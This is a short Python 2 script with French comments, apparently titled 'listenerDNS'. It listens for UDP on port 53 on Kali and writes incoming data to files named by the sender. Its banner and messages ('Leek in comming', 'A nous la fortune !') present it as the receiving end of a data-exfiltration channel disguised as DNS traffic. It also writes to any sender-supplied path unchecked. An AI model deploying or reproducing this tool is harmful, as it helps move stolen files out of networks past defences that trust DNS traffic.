from socket import *
import time
import sys
import os
import select

#Clean Console on Kali
os.system('clear')
#ligne d'animation
animation = "\n \nChuuuut !   Leek in comming..."
for i in range(38):
    time.sleep(0.05)
    sys.stdout.write(animation[i % len(animation)])
    sys.stdout.flush()

print """
  _   _         _                                  _____    _   _    _____ 
 | | (_)       | |                                |  __ \  | \ | |  / ____|
 | |  _   ___  | |_    ___   _ __     ___   _ __  | |  | | |  \| | | (___  
 | | | | / __| | __|  / _ \ | '_ \   / _ \ | '__| | |  | | | . ` |  \___ \ 
 | | | | \__ \ | |_  |  __/ | | | | |  __/ | |    | |__| | | |\  |  ____) |
 |_| |_| |___/  \__|  \___| |_| |_|  \___| |_|    |_____/  |_| \_| |_____/ 
 		@author  Raphael Delaporte                                                                           
                                                                           

"""


# On se met en ecoute sur le port 53
# il faut prealablement stoper le service bind9 qui ecoute deja sur le port 53
host="0.0.0.0"
port = 53
def const() :
	# on definit une variable global s qui aura comme entre un socket
	global s 
	s = socket(AF_INET,SOCK_DGRAM)
	# On bind un socket qui sera en attente de data
	s.bind((host,port))
	addr = (host,port)
	# ici une autre variable global qui contient notre buffer
	global buf
	buf = 1024

def sock():

	print "Listen, do you hear the song ? The song of victory gna gna gna ..."
	#le socket est en attente de data
	data,addr = s.recvfrom(buf)
	print "I m here from the shadow ..." + '\n',data.strip()
	f = open(data.strip(),'wb')
	#on creer un nouveau fichier avec le meme nom que celui qui arrive
	data,addr = s.recvfrom(buf)
	try:
	    #tant qu il y a de la data, on l ecrit dans le fichier cree
	    while(data):
		f.write(data)
		s.settimeout(2)
		data,addr = s.recvfrom(buf)
	except timeout:
	    f.close()
	    s.close()
	    #une fois le buffer vide, on ferme le socket et le fichier
	    print "Transfer complet... A nous la fortune !"
	    
	    



def main() :
	#On execute le script a l infinit pour eviter de relancer le listener en cas
	# d arrives multiples de fichiers
	while True :
		const()
		sock()

main()
